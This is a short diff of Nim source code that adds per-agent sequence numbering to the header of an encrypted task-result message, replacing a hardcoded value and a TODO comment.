@@ -1,10 +1,7 @@
 import times, sugar
-import ../../common/[types, serialize, crypto, utils]
+import ../../common/[types, serialize, sequence, crypto, utils]
 
 proc createTaskResult*(task: Task, status: StatusType, resultType: ResultType, resultData: seq[byte]): TaskResult = 
-
-    # TODO: Implement sequence tracking
-
     return TaskResult(
         header: Header(
             magic: MAGIC,
@@ -13,7 +10,7 @@ proc createTaskResult*(task: Task, status: StatusType, resultType: ResultType, r
             flags: cast[uint16](FLAG_ENCRYPTED),
             size: 0'u32,
             agentId: task.header.agentId,
-            seqNr: 1'u64, 
+            seqNr: nextSequence(task.header.agentId), 
             iv: generateIV(),
             gmac: default(array[16, byte])
         ), 
